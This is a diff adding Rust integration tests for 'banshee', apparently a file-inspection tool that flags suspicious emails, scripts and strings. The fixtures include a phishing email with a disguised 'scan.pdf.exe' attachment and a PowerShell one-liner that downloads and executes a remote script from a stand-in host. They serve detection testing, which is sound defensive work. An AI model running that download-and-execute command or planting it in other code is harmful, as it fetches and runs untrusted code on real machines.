@@ -46,6 +46,157 @@ fn banner_prints_wordmark_and_mask_silhouette() {
 }
 
 #[test]
+fn dotnet_metadata_of_a_framework_assembly() {
+    // Uses the .NET Framework installed on Windows; skipped elsewhere.
+    let path = std::path::Path::new(r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll");
+    if !path.exists() {
+        return;
+    }
+    let mut command = Command::cargo_bin("banshee").expect("binary");
+    command
+        .args(["file", "inspect"])
+        .arg(path)
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("Format: PE executable (.NET)"))
+        .stdout(predicate::str::contains(".NET assembly: System 4.0.0.0"))
+        .stdout(predicate::str::contains("mscorlib 4.0.0.0"))
+        .stdout(predicate::str::contains("kernel32.dll!"));
+}
+
+#[test]
+fn email_messages_list_attachments_and_mismatches() {
+    let path = temp_fixture("message.eml");
+    std::fs::write(
+        &path,
+        "From: Support <help@bank.test>\r\nReply-To: pay@collector.test\r\nSubject: Invoice\r\n\
+Date: Mon, 12 Oct 2026 10:00:00 +0000\r\nMessage-ID: <1@bank.test>\r\nMIME-Version: 1.0\r\n\
+Content-Type: multipart/mixed; boundary=\"b\"\r\n\r\n--b\r\nContent-Type: text/plain\r\n\r\n\
+Open http://pay.collector.test/i\r\n--b\r\nContent-Type: application/x-msdownload\r\n\
+Content-Disposition: attachment; filename=\"scan.pdf.exe\"\r\nContent-Transfer-Encoding: base64\r\n\r\n\
+TVqQAA==\r\n--b--\r\n",
+    )
+    .expect("write message");
+    let mut command = Command::cargo_bin("banshee").expect("binary");
+    command
+        .args(["file", "inspect"])
+        .arg(&path)
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("Format: Email message"))
+        .stdout(predicate::str::contains(
+            "scan.pdf.exe (application/x-msdownload, 4 bytes",
+        ))
+        .stdout(predicate::str::contains("double extension"))
+        .stdout(predicate::str::contains(
+            "reply-to domain (collector.test) differs",
+        ))
+        .stdout(predicate::str::contains("http://pay.collector.test/i"));
+    std::fs::remove_file(path).expect("remove message");
+}
+
+#[test]
+fn script_files_report_high_signal_behaviors() {
+    let path = temp_fixture("dropper.ps1");
+    std::fs::write(
+        &path,
+        "IEX (New-Object Net.WebClient).DownloadString('http://x.example.test/a.ps1')\n",
+    )
+    .expect("write script");
+    let mut command = Command::cargo_bin("banshee").expect("binary");
+    command
+        .args(["file", "inspect"])
+        .arg(&path)
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("Format: PowerShell script"))
+        .stdout(predicate::str::contains(
+            "downloads content and executes it in memory",
+        ));
+    std::fs::remove_file(path).expect("remove script");
+}
+
+#[test]
+fn console_history_saves_and_replays_a_session() {
+    let script = temp_fixture("session.txt");
+    let _ = std::fs::remove_file(&script);
+    let script_path = script.display().to_string();
+    let mut record = Command::cargo_bin("banshee").expect("binary");
+    record
+        .arg("shell")
+        .write_stdin(format!(
+            "decode base64 aGVsbG8=\nhistory\n!1\n!7\nsave {script_path}\nsave {script_path}\nexit\n"
+        ))
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("   1  decode base64 aGVsbG8="))
+        .stdout(predicate::str::contains("Saved 2 command(s)"))
+        .stderr(predicate::str::contains("no such history entry"))
+        .stderr(predicate::str::contains("add --force"));
+    assert_eq!(
+        std::fs::read_to_string(&script).expect("saved script"),
+        "decode base64 aGVsbG8=\ndecode base64 aGVsbG8=\n"
+    );
+
+    let mut replay = Command::cargo_bin("banshee").expect("binary");
+    replay
+        .arg("shell")
+        .write_stdin(format!("run {script_path}\nexit\n"))
+        .assert()
+        .success()
+        .stdout(predicate::str::contains(
+            "banshee> decode base64 aGVsbG8=\nhello\n",
+        ));
+    std::fs::remove_file(script).expect("remove script");
+}
+
+#[test]
+fn hexdump_shows_a_bounded_window() {
+    let mut command = Command::cargo_bin("banshee").expect("binary");
+    command
+        .args(["hexdump", "--offset", "0x2", "-n", "5", "--width", "8"])
+        .arg("ABCDEFGHIJ")
+        .assert()
+        .success()
+        .stdout("00000002  43 44 45 46  47           |CDEFG|\n00000007\n");
+}
+
+#[test]
+fn strings_lists_ascii_and_utf16_with_offsets() {
+    let path = temp_fixture("strings.bin");
+    let mut data = b"\x00\x01http://evil.example.test/a\x00\xff".to_vec();
+    data.extend("WideName".encode_utf16().flat_map(u16::to_le_bytes));
+    std::fs::write(&path, &data).expect("write fixture");
+
+    let mut text = Command::cargo_bin("banshee").expect("binary");
+    text.args(["strings", "--file"])
+        .arg(&path)
+        .assert()
+        .success()
+        .stdout(predicate::str::contains(
+            "0x00000002  ascii    http://evil.example.test/a",
+        ))
+        .stdout(predicate::str::contains("utf16le  WideName"));
+
+    let mut plain = Command::cargo_bin("banshee").expect("binary");
+    plain
+        .args(["strings", "--plain", "--encoding", "utf16le", "--file"])
+        .arg(&path)
+        .assert()
+        .success()
+        .stdout("WideName\n");
+
+    let mut bounded = Command::cargo_bin("banshee").expect("binary");
+    bounded
+        .args(["strings", "--max-strings", "1", "--file"])
+        .arg(&path)
+        .assert()
+        .success()
+        .stderr(predicate::str::contains("listed 1 of 2 strings"));
+    std::fs::remove_file(path).expect("remove fixture");
+}
+
+#[test]
 fn lang_tr_translates_labels_but_not_machine_readable_output() {
     let mut turkish = Command::cargo_bin("banshee").expect("binary");
     turkish
